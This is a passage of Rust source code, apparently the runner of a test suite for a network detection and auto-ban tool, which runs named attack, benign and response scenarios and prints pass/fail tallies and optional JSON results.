        format!("drained {n} events in {:.2}s = {:.0} events/s (floor 100k/s)", secs, rate))
}

async fn layer_b() -> Vec<Outcome> {
    vec![
        b_victim_ban().await,
        b_spoofed_infra("B08", "Forged-source exploit packet naming the default gateway", gateway()).await,
        b_spoofed_infra("B09", "Forged-source exploit packet naming the DNS resolver", resolver()).await,
        b_blind_after_verdict().await,
        b_dilution().await,
        b_ban_table_exhaustion().await,
        b_authorised_scanner().await,
        b_event_flood().await,
        b_engine_throughput().await,
    ]
}

// ---------------------------------------------------------------------

fn expect_str(e: Expect) -> &'static str {
    match e { Expect::Detect => "detect", Expect::Quiet => "stay quiet", Expect::Respond => "respond safely", Expect::Known => "known limitation" }
}

#[tokio::main(flavor = "multi_thread", worker_threads = 4)]
async fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.iter().any(|a| a == "--no-protect-list") {
        PROTECT_LIST.store(false, std::sync::atomic::Ordering::Relaxed);
    }
    let json_path = args.iter().position(|a| a == "--json").and_then(|i| args.get(i + 1)).cloned();

    let mut all = layer_a();
    all.extend(layer_b().await);
    if !args.iter().any(|a| a == "--no-round2") {
        all.extend(round2::layer_c_detect());
        all.extend(round2::layer_c_response().await);
    }

    println!("{:<5} {:<5} {:<6} {}", "ID", "EXP", "RESULT", "SCENARIO  --  detail");
    for o in &all {
        println!(
            "{:<5} {:<5} {:<6} {}  --  {}",
            o.id,
            match o.expect { Expect::Detect => "det", Expect::Quiet => "quiet", Expect::Respond => "resp", Expect::Known => "known" },
            if o.pass { "PASS" } else { "FAIL" },
            o.name,
            o.detail
        );
    }
    let attacks: Vec<&Outcome> = all.iter().filter(|o| o.expect == Expect::Detect).collect();
    let benign: Vec<&Outcome> = all.iter().filter(|o| o.expect == Expect::Quiet).collect();
    let resp: Vec<&Outcome> = all.iter().filter(|o| o.expect == Expect::Respond).collect();
    let n = |v: &Vec<&Outcome>| v.iter().filter(|o| o.pass).count();
    let scored: Vec<&Outcome> = all.iter().filter(|o| o.expect != Expect::Known).collect();
    println!();
    println!("Detection : {}/{} attack scenarios detected", n(&attacks), attacks.len());
    println!("Benign    : {}/{} benign controls quiet", n(&benign), benign.len());
    println!("Response  : {}/{} response-safety scenarios passed", n(&resp), resp.len());
    let fails = scored.iter().filter(|o| !o.pass).count();
    println!("TOTAL     : {}/{} passed (known-limitation rows not scored)", scored.len() - fails, scored.len());

    if let Some(path) = json_path {
        let j: Vec<serde_json::Value> = all
            .iter()
            .map(|o| serde_json::json!({
                "id": o.id, "layer": o.layer, "name": o.name, "technique": o.technique,
                "expect": expect_str(o.expect), "pass": o.pass, "detail": o.detail,
            }))
            .collect();
        let _ = std::fs::write(&path, serde_json::to_string_pretty(&j).unwrap());
    }
    std::process::exit(fails.min(100) as i32);
}
